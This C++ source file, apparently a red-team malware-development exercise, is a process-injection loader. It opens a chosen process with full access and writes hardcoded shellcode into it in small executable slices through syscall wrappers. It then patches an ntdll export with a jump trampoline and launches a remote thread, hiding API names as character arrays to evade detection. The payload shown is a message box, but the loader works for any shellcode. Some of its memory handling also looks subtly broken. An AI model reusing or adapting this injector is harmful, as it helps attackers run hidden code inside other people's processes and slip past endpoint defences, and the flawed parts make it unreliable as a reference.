// Drip2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <vector>
#include "syscalls_common.h"
#include "zNt.h"
#include <ShLwApi.h>
#include <Psapi.h>
using namespace std;


const vector<LPVOID> VC_PREF_BASES{ (void*)0x00000000DDDD0000,
                                         (void*)0x0000000010000000,
                                         (void*)0x0000000021000000,
                                         (void*)0x0000000032000000,
                                         (void*)0x0000000043000000,
                                         (void*)0x0000000050000000,
                                         (void*)0x0000000041000000,
                                         (void*)0x0000000042000000,
                                         (void*)0x0000000040000000,
                                         (void*)0x0000000022000000 };

char jmpModName[]{ 'n','t','d','l','l','.','d','l','l','\0' };
// RtlpWow64CtxFromAmd64
char jmpFuncName[]{ 'R','t','l','p','W','o','w','6','4','C','t','x','F','r','o','m','A','m','d','6','4','\0' };

int main()
{
    // Get system information 
    SYSTEM_INFO sys_inf;
    GetSystemInfo(&sys_inf);

    DWORD page_size{ sys_inf.dwPageSize };
    DWORD alloc_gran{ sys_inf.dwAllocationGranularity };

    // Still do it
    if (NULL == page_size)
        page_size = 0x1000;
    //cout << "Page Size: " << page_size << "\n";

    if (NULL == alloc_gran)
        alloc_gran = 0x10000;

    // Open process handle
    int tpid{ 0 };
    cout << "[+] Please Enter Target Process: ";
    cin >> tpid;

    cout << "\t[*] Getting Handle to Target Process " << tpid << "\n";
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tpid);


    // ------------------ Decclare Variable Values -------------------
    unsigned char shellcode[] = 
    {
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
        0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
        0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
        0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
        0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
        0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
        0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
        0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
        0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
        0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
        0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
        0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
        0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
        0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
        0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
        0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
        0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
        0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
        0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
        0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
        0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
        0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
        0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
        0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
        0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
        0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
    };

    int szSc = { sizeof(shellcode) };
    SIZE_T szVmResv{ alloc_gran };
    SIZE_T szVmCmm{ page_size };
    DWORD  cVmResv = (szSc / szVmResv) + 1; // shellcode divided by the 64kb (AG) + 1
    DWORD  cVmCmm = szVmResv / szVmCmm; // divide page size by Allocated Granulatiy should be 16 in this case
    LPVOID vmBaseAddress = NULL;

    // ------------------ Check for suitable address -------------------
    cout << "\n[+] Checking for Suitable Address " << tpid << "\n";
    MEMORY_BASIC_INFORMATION mbi;
    for (auto base : VC_PREF_BASES) {
        cout << "\t[*] Checking Base: " << base << " -> " << &base << "\n"; // DEBUGGING
        VirtualQueryEx(hProc, base, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
        if (mbi.State == MEM_FREE)
        {
            cout << "\t\t[*] Page Attribute: MEM_FREE" << " -> " << std::hex << mbi.State << "\n"; //DEBUGGING
            uint64_t i;
            for (i = 0; i < cVmResv; ++i) {
                LPVOID currentBase = (void*)((DWORD_PTR)base + (i * alloc_gran));
                VirtualQueryEx(hProc, currentBase, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

                if (MEM_FREE != mbi.State)
                    break;
            }


            if (i == cVmResv) {
                // found suitable base

                cout << "\t\t[*] Found Suitable Address " << base << " -> " << &base << "\n"; // DEBUGGING
                vmBaseAddress = base;
                break;
            }
        }
    }

    // ------------------ Allocate Memory for shellcode -------------------
    cout << "\n[+] Allocating Memory For Shellcode \n"; // DEBUGGING
    NTSTATUS  status{ 0 };
    DWORD     cmm_i;
    LPVOID    currentVmBase{ vmBaseAddress };

    vector<LPVOID>  vcVmResv;

    // Reserve enough memory
    DWORD i;

    cout << "\t[*] Reserving " << cVmResv << " 64kb Region \n"; // DEBUGGING
    for (i = 1; i <= cVmResv; ++i)
    {
        cout << "\t\t[*] Allocating Memory at: " << &currentVmBase << "\n";
        status = NtAllocateVirtualMemory(
            hProc,
            &currentVmBase,
            NULL,
            &szVmResv,
            MEM_RESERVE,
            PAGE_NOACCESS
        );


        vcVmResv.push_back(currentVmBase);
        cout << "\t[*] Reserving Suitable Base: " << &currentVmBase << "\n";
        currentVmBase = (LPVOID)((DWORD_PTR)currentVmBase + szVmResv);
    }

    DWORD           offsetSc{ 0 };
    DWORD           oldProt;

    // Loop over the pages and commit our sc blob in 4kB slices
    double prcDone{ 0 };
    for (i = 0; i < cVmResv; ++i)
    {
        for (cmm_i = 0; cmm_i < cVmCmm; ++cmm_i)
        {
            prcDone += 1.0 / cVmResv / cVmCmm;

            DWORD offset = (cmm_i * szVmCmm);
            currentVmBase = (LPVOID)((DWORD_PTR)vcVmResv[i] + offset);

            status = NtAllocateVirtualMemory(
                hProc,
                &currentVmBase,
                NULL,
                &szVmCmm,
                MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
            );

            cout << "\t\t[*] Allocating Mmeory at: " << &currentVmBase << "\n";

            SIZE_T szWritten{ 0 };

            status = NtWriteVirtualMemory(
                hProc,
                currentVmBase,
                &shellcode[offsetSc],
                szVmCmm,
                &szWritten
            );
            offsetSc += szVmCmm;
            cout << "\t\t[*] Writing Shellcode to Memory at: " << &currentVmBase << "\n";

            NtProtectVirtualMemory(
                hProc,
                &currentVmBase,
                &szVmCmm,
                PAGE_EXECUTE_READWRITE,
                &oldProt
            );

            MEMORY_BASIC_INFORMATION bbi;
            VirtualQueryEx(hProc, currentVmBase, &bbi, sizeof(MEMORY_BASIC_INFORMATION));
            cout << "\t\t[*] Changed Memory Protection At Shellcode to Memory at: " << &currentVmBase << " -> 0x" << hex << bbi.State << "\n\n";
            

        }
    }


    // ------------------------ Prep Trampoline Function ------------------------------

    cout << "\n[+] Prepping Trmpoline Function \n"; // DEBUGGING
    unsigned char* b = (unsigned char*)&vmBaseAddress; // 0x00000000dddd0000

    unsigned char jmpSc[7]{
        0xB8, b[0], b[1], b[2], b[3],
        0xFF, 0xE0
    };

    cout << "\t[*] VMBase: " << &vmBaseAddress << "\n";
    cout << "\t[*] VMBase: " << vmBaseAddress << "\n";
    cout << "\t[*] jmpSc: " << &jmpSc << "\n";
    cout << "\t[*] jmpSc: " << jmpSc << "\n";

    unsigned char* cp = jmpSc;
    for (; *cp != '\0'; ++cp)
    {
        printf("%02x", *cp);
    }

    // Print Assembley Instructions
    cout << "hashedChars: \n";
    for (int i = 0; i < 7; i++) {
        printf("%x", jmpSc[i]);
    }




    HMODULE hJmpMod = LoadLibraryExA(
        jmpModName,
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );

    if (!hJmpMod)
        cout << "\n\n[!!] ZACH NOT WORKING\n";


    LPVOID  lpDllExport = GetProcAddress(hJmpMod, jmpFuncName);


    DWORD   offsetJmpFunc = (DWORD)lpDllExport - (DWORD)hJmpMod;
    
    /** DEBUGGING
    cout << "\n\lpDllExport: " << lpDllExport << "\n";
    cout << "\n\lpDllExport: " << &lpDllExport << "\n";


    cout << "\n\noffsetJmpFunc: " << offsetJmpFunc << "\n";
    cout << "\n\noffsetJmpFunc: " << &offsetJmpFunc << "\n";
    getchar();
    getchar();
    **/

    LPVOID  lpRemFuncEP{ 0 };

    HMODULE hMods[1024];
    DWORD   cbNeeded;
    char    szModName[MAX_PATH];

    printf("ZACH\n\n");
    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &cbNeeded))
    {
        int i;
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            if (GetModuleFileNameExA(hProc, hMods[i], szModName, sizeof(szModName) / sizeof(char)))
            {
                if (strcmp(PathFindFileNameA(szModName), jmpModName) == 0) {
                    lpRemFuncEP = hMods[i];
                    break;
                }
            }
        }
    }
    //

    lpRemFuncEP = (LPVOID)((DWORD_PTR)lpRemFuncEP + offsetJmpFunc);

    if (NULL == lpRemFuncEP)
        printf("ERROR\n");

    SIZE_T szWritten{ 0 };
    WriteProcessMemory(
        hProc,
        lpDllExport,
        jmpSc,
        sizeof(jmpSc),
        &szWritten
    );

    LPVOID entry = lpDllExport;

    //
    HANDLE hThread = NULL;

    /** DEBUGGING
    cout << "[#] Entry Address is: " << &entry;
    cout << "[#] Entry Address is: " << entry;
    getchar();
    getchar();
    **/


    ZNtCTE(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProc,
        (LPTHREAD_START_ROUTINE)entry,
        NULL,
        FALSE,
        0,
        0,
        0,
        nullptr
    );

    if (hThread == NULL)
    {
        CloseHandle(hProc);
        printf("\n NtCreateThreadEx failed, Error=0x%.8x", GetLastError());
        getchar();
        return FALSE;
    }
    if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
    {
        printf("[!]WaitForSingleObject error\n");
        getchar();
        return FALSE;
    }


    getchar();
    getchar();
}


